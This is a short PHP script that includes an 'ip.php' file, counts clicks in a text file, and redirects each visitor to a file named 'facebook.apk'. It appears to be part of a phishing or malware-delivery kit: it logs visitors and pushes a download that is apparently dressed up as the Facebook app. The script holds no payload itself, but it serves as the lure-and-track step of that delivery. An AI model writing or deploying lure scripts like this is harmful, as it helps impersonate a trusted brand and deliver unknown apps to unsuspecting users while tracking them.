<? include 'ip.php';
$file='click.txt';
if(!file_exists($file)){
file_put_contents($file,0);
}
file_put_contents($file,file_get_contents($file)+1);
header('Location: facebook.apk');
exit();